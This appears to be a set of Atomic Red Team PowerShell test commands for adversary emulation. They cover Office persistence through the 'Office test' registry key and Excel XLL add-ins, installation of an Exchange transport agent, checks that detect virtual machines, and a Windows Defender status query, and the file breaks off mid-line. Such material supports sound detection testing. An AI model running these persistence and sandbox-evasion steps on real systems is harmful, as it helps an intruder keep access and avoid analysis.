"powershell.exe" & {$wdApp = New-Object -COMObject \""Word.Application\""
if(-not $wdApp.path.contains(\""Program Files (x86)\""))  
{
  Write-Host \""64-bit Office\""
  reg add \""HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf\"" /t REG_SZ /d \""C:\AtomicRedTeam\atomics\T1137.002\bin\officetest_x64.dll\"" /f       
}
else{
  Write-Host \""32-bit Office\""
  reg add \""HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf\"" /t REG_SZ /d \""C:\AtomicRedTeam\atomics\T1137.002\bin\officetest_x86.dll\"" /f
}
Stop-Process -Name \""WinWord\"" 
Start-Process \""WinWord\""}

"powershell.exe" & {$excelApp = New-Object -COMObject \""Excel.Application\""
if(-not $excelApp.path.contains(\""Program Files (x86)\"")){
    Write-Host \""64-bit Office\""
    $excelApp.RegisterXLL(\""C:\AtomicRedTeam\atomics\T1137.006\bin\Addins\excelxll_x64.xll\"")
}
else{
  Write-Host \""32-bit Office\""
  $excelApp.RegisterXLL(\""C:\AtomicRedTeam\atomics\T1137.006\bin\Addins\excelxll_x86.xll\"")
}}

"powershell.exe" & {Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath c:\program files\microsoft\Exchange Server\v15\bin\Microsoft.Exchange.Security.Interop.dll
Enable-TransportAgent Security Interop Agent
Get-TransportAgent | Format-List Name,Enabled}

"powershell.exe" & {$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \""Manufacturer\""
$Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \""Model\""
if((($Manufacturer.ToLower() -eq \""microsoft corporation\"") -and ($Model.ToLower().contains(\""virtual\""))) -or ($Manufacturer.ToLower().contains(\""vmware\"")) -or ($Model.ToLower() -eq \""virtualbox\"")) {write-host \""Virtualization environment detected!\""} else {write-host \""No virtualization environment detected!\""}}

"powershell.exe" & {Get-Service WinDefend #check the service state of Windows Defender
